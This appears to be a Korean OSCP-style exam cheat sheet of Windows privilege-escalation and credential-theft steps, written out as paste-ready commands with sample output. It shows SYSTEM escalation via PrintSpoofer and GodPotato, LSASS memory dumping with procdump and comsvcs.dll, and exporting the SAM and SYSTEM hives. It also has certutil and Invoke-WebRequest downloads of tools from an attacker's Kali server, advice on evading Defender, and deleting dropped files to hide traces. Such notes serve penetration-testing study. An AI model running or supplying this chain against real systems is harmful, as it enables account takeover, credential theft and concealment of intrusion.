# 종합 실습 시나리오 + 도구 운용 (OSCP 기준)

- 전제: 아래 블록을 한 번에 하나씩 붙여넣는다. `DONE_`이 안 보이면 실행 안 된 것이다.

# 시나리오

- 시나리오 A: 웹쉘(IIS AppPool) → `whoami /priv`에서 SeImpersonatePrivilege 발견

```powershell
C:\temp\PrintSpoofer64.exe -i -c "whoami"; Write-Output DONE_A
```

```text
nt authority\system
DONE_A
```

  - 플래그 수집

```powershell
Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue; Write-Output DONE_Aflag
```

```text
Directory: C:\Windows\System32\Desktop
-a--- 10/13/2026      34 proof.txt
DONE_Aflag
```

- 시나리오 B: MSSQL `xp_cmdshell` (mssqlserver 계정) → SeImpersonatePrivilege 발견

```powershell
C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"; Write-Output DONE_B
```

```text
nt authority\system
DONE_B
```

- 시나리오 C: 로컬 관리자 쉘 → SeDebugPrivilege 발견
  - 01 문서 순서대로 `procdump -ma lsass.exe` → Kali에서 `pypykatz`로 자격 증명 추출

```text
Dump complete: 1 dump file written.
== LogonSession ==
username: Administrator / nthash REDACTED
```

  - 같은 패스워드 재사용 여부 확인 후 측면 이동

# 도구 준비 체크리스트

- `PrintSpoofer64.exe` / `PrintSpoofer32.exe`
- `GodPotato-NET4.exe`
- `SweetPotato.exe`
- `JuicyPotato.exe` + OS별 CLSID 목록
- `procdump.exe` (Sysinternals)
- `mimikatz.exe` 또는 Kali의 `pypykatz`
- `nc.exe` 또는 PowerShell 리버스쉘 원라이너

# 도구 운용 방식 (OSCP 기준)

- 설치가 아니다. 타겟에 인스톨러를 돌리는 게 아니라 Kali에서 준비한 단일 exe를 업로드해서 실행만 한다
- 타겟은 보통 인터넷이 안 되므로 Kali를 http 서버로 열어 전송한다
  - Kali: `python3 -m http.server 8000`

```text
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.x.x - - [13/Oct/2026] "GET /PrintSpoofer64.exe HTTP/1.1" 200 -
```

  - 타겟: `certutil` 방식 (진행률 + 완료 메시지가 보여서 리버스쉘에서 확인 쉽다)

```powershell
certutil -urlcache -split -f http://KALI_IP:8000/PrintSpoofer64.exe C:\temp\ps.exe; Write-Output DONE_cert
```

```text
****  Online  ****
  0000  ...
****  Download Complete  ****
CertUtil: -URLCache command completed successfully.
DONE_cert
```

  - 타겟: `IWR` 방식 (성공 시 본문 출력 없음 → 스칼라 검증이 필수)

```powershell
$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -TimeoutSec 20 http://KALI_IP:8000/GodPotato-NET4.exe -OutFile C:\temp\gp.exe; Write-Output DONE_dlgp
```

```powershell
Test-Path C:\temp\gp.exe; (Get-Item C:\temp\gp.exe).Length; Write-Output DONE_sizegp
```

```text
True
300000
DONE_sizegp
```

- 실행 위치는 쓰기 가능한 임시 폴더만 쓴다
  - `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`
  - 현재 사용자 Temp 확인:

```powershell
$env:TEMP; Write-Output DONE_temp
```

```text
C:\Users\Administrator\AppData\Local\Temp
DONE_temp
```

- 사용 후 흔적 제거는 기본이다

```powershell
Remove-Item C:\temp\ps.exe, C:\temp\gp.exe -Force; Write-Output DONE_clean
```

```text
DONE_clean
```

- mimikatz는 타겟에서 직접 돌리지 말고 덤프만 빼온다
  - 이유: 백신(Defender)에 즉시 탐지/삭제된다
  - 정석: 타겟에서 `procdump -ma lsass.exe` → dmp만 Kali로 가져오기 → Kali에서 `pypykatz`로 분석
- exe 업로드가 막히면 파일 없는(Living-off-the-land) 방법을 쓴다
  - LSASS 덤프:

```powershell
$p=(Get-Process -Name lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full; Write-Output DONE_lol
```

  - 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
  - SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요

```powershell
reg save HKLM\SAM C:\temp\SAM; reg save HKLM\SYSTEM C:\temp\SYSTEM; Write-Output DONE_reg
```

```text
The operation completed successfully.
The operation completed successfully.
DONE_reg
```
